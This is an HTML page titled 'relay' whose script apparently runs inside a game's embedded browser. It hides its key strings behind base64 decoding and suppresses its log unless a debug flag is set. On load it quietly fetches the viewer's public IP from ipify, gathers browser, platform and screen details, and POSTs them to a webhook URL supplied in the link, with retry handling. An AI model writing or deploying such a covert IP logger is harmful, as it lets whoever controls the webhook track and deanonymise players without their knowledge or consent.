<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>relay</title>
  <style>
    html,body{margin:0;height:100%;background:#111;color:#eee;font-family:monospace}
    #log{position:absolute;left:0;top:0;padding:10px;font-size:22px;line-height:1.4;white-space:pre-wrap;word-break:break-all;overflow-wrap:anywhere}
    .ok{color:#6f6} .bad{color:#f66} .dim{color:#888}
    #views{position:absolute;right:0;bottom:0;padding:8px}
    #views img{height:26px}
  </style>
</head>
<body>
  <div id="log"></div>
  <div id="views"><img id="hits" alt=""></div>
  <script src="cohtml.js"></script>
  <script>
    // ---- obfuscated literals (names that must match the game side stay decoded at runtime) ----
    function D(s){
      var t = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
      s = String(s).replace(/=+$/, '');
      var o = '', i, a, b, c, d;
      for (i = 0; i < s.length; i += 4){
        a = t.indexOf(s.charAt(i)); b = t.indexOf(s.charAt(i+1));
        c = s.charAt(i+2) ? t.indexOf(s.charAt(i+2)) : -1;
        d = s.charAt(i+3) ? t.indexOf(s.charAt(i+3)) : -1;
        o += String.fromCharCode((a << 2) | (b >> 4));
        if (c >= 0) o += String.fromCharCode(((b & 15) << 4) | (c >> 2));
        if (d >= 0) o += String.fromCharCode(((c & 3) << 6) | d);
      }
      return o;
    }
    var K_WEBHOOK = D('V2ViaG9vaw=='), K_MESSAGE = D('TWVzc2FnZQ=='),
        K_USER    = D('VXNlcm5hbWU='), K_VIEWS = D('Vmlld3M='),
        N_POST    = D('X19wb3N0V2ViaG9vaw=='), N_OK = D('T25XZWJob29rT0s='),
        N_FAIL    = D('T25XZWJob29rRmFpbA=='), N_COUNT = D('T25WaWV3Q291bnQ='),
        N_COUNTF  = D('T25WaWV3Q291bnRGYWls'), N_ALIVE = D('T25KU0FsaXZl'),
        N_READY   = D('UmVhZHk='), IP_URL = D('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u');

    var UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

    // on-screen log OFF unless the load URL has ?debug=1
    var DEBUG = /[?&]debug=1/.test(window.location.search);
    var logEl = document.getElementById('log');
    function log(s, cls){ if (!DEBUG) return; try { logEl.innerHTML += '\n' + (cls ? ('<span class="'+cls+'">'+s+'</span>') : s); } catch(e){} }

    // act only once the Cohtml bridge is attached (re-checked each call)
    function engaged(){ return typeof engine !== 'undefined' && engine.isAttached === true; }
    function whenEngaged(cb, tries){
      tries = tries || 0;
      if (engaged()) return cb();
      if (tries >= 20){ log('blocked: engine not attached', 'bad'); return; }
      setTimeout(function(){ whenEngaged(cb, tries + 1); }, 250);
    }

    function call(n){
      try { if (typeof engine !== 'undefined' && engine.isAttached && engine.trigger) engine.trigger(n); } catch(e){}
    }
    window.onerror = function(m, u, l, c){ log('err ' + m + ' @' + l + ':' + c, 'bad'); };
    window.addEventListener('unhandledrejection', function(e){ log('rej ' + (e.reason && e.reason.message ? e.reason.message : e.reason), 'bad'); });

    log('attached=' + engaged());
    call(N_ALIVE);
    if (typeof engine !== 'undefined'){ engine.on(N_READY, function(){ log('ready'); }); }

    var MIN_GAP_MS = 5000, lastSend = 0;
    function respText(x){ var t = ''; try { t = (x.responseText || ''); } catch(e){} if (t.length > 400) t = t.substring(0, 400) + '...'; return t ? ('| ' + t) : ''; }

    function send(url, body, tag, isRetry){
      if (!engaged()){ log('blocked: engine not attached', 'bad'); return; }
      try {
        var now = Date.now();
        if (!isRetry && now - lastSend < MIN_GAP_MS){ log('throttled'); return; }
        lastSend = now;
        var x = new XMLHttpRequest();
        x.open('POST', url + (url.indexOf('?') < 0 ? '?' : '&') + 'wait=true', true);
        x.setRequestHeader('Content-Type', 'application/json');
        try { x.setRequestHeader('User-Agent', UA); } catch(e){}
        x.timeout = 10000;
        x.onreadystatechange = function(){
          if (x.readyState !== 4) return;
          var resp = respText(x);
          if (x.status === 429){
            var wait = 1.5; try { wait = JSON.parse(x.responseText).retry_after || wait; } catch(e){}
            log('429 retry ' + wait + 's ' + resp, 'bad');
            setTimeout(function(){ send(url, body, tag, true); }, Math.ceil(wait * 1000) + 250);
            return;
          }
          var ok = (x.status >= 200 && x.status < 300);
          log(tag + ' ' + x.status + ' ' + resp, ok ? 'ok' : 'bad');
          call(ok ? N_OK : N_FAIL);
        };
        x.onerror   = function(){ log(tag + ' net err', 'bad'); call(N_FAIL); };
        x.ontimeout = function(){ log(tag + ' timeout', 'bad'); call(N_FAIL); };
        x.send(body);
      } catch(e){ log(tag + ' threw ' + e, 'bad'); }
    }

    // ---- load-URL config: ?<K_WEBHOOK>=..&<K_MESSAGE>=..&<K_USER>=..  ('^' means space) ----
    var SPACE_SYMBOL = '^';
    function qs(name){
      try { var m = new RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search); return m ? decodeURIComponent(m[1]) : ''; } catch(e){ return ''; }
    }
    function human(s){ return s.split(SPACE_SYMBOL).join(' '); }

    var VARS = {
      IP:'unknown', UA:navigator.userAgent, TIME:new Date().toLocaleString(), DATE:new Date().toLocaleDateString(),
      URL:window.location.href, LANG:navigator.language||'', PLATFORM:navigator.platform||'',
      SCREEN:(window.screen?(screen.width+'x'+screen.height):''), RANDOM:String(Math.floor(Math.random()*1e9))
    };
    var SPECIAL = {
      SP:' ', NL:'\n', CR:'\r', TAB:'\t', AMP:'&', HASH:'#', PCT:'%', PLUS:'+', QM:'?', EQ:'=',
      DOL:'$', TIL:'~', CARET:'^', BT:'`', PIPE:'|', LT:'<', GT:'>', QT:'"', AP:"'", BS:'\\'
    };
    var TOKEN_RE = new RegExp('[\\$\u00A7](' + Object.keys(SPECIAL).concat(Object.keys(VARS))
      .sort(function(a,b){ return b.length - a.length; }).join('|') + ')', 'g');
    function applyVars(s, jsonSafe){
      s = String(s).replace(/\$\$/g, '\u0001').replace(/\u00A7\u00A7/g, '\u0002');
      s = s.replace(TOKEN_RE, function(m, k){
        if (jsonSafe){
          if (k==='NL') return '\\n'; if (k==='CR') return '\\r'; if (k==='TAB') return '\\t';
          if (k==='QT') return '\\"'; if (k==='BS') return '\\\\';
        }
        if (SPECIAL.hasOwnProperty(k)) return SPECIAL[k];
        if (VARS.hasOwnProperty(k))    return VARS[k];
        return m;
      });
      return s.replace(/\u0001/g, '$').replace(/\u0002/g, '\u00A7');
    }
    function getIP(cb){
      try {
        var x = new XMLHttpRequest(); x.open('GET', IP_URL, true); x.timeout = 5000;
        x.onreadystatechange = function(){ if (x.readyState !== 4) return; try { VARS.IP = JSON.parse(x.responseText).ip || 'unknown'; } catch(e){} cb(); };
        x.onerror = x.ontimeout = function(){ cb(); }; x.send();
      } catch(e){ cb(); }
    }

    var qWebhook = qs(K_WEBHOOK), qMessage = qs(K_MESSAGE), qUser = qs(K_USER);
    function bodyFromParams(){
      var msg = applyVars(human(qMessage)), usr = applyVars(human(qUser));
      var p = { content: msg }; if (usr) p.username = usr; return JSON.stringify(p);
    }
    if (qWebhook){ whenEngaged(function(){ getIP(function(){ send(qWebhook, bodyFromParams(), 'url'); }); }); }

    // ---- game -> JS event ----
    try {
      var handler = function(url, body){
        var u = url || qWebhook, b = body;
        if (!b){ b = bodyFromParams(); } else { b = applyVars(b, true); }
        if (u) send(u, b, 'evt'); else log('no url', 'bad');
      };
      window[N_POST] = handler;
      if (typeof engine !== 'undefined' && engine.on){ engine.on(N_POST, handler); }
    } catch(e){ log('bind err ' + e, 'bad'); }

    // ---- optional view badge: ?<K_VIEWS>=<svg url> ----
    try {
      var badge = qs(K_VIEWS);
      if (badge){
        var img = document.getElementById('hits');
        img.onload = function(){ call(N_COUNT); }; img.onerror = function(){ call(N_COUNTF); };
        img.src = badge + (badge.indexOf('?') < 0 ? '?' : '&') + 't=' + Date.now();
      }
    } catch(e){}
  </script>
</body>
</html>
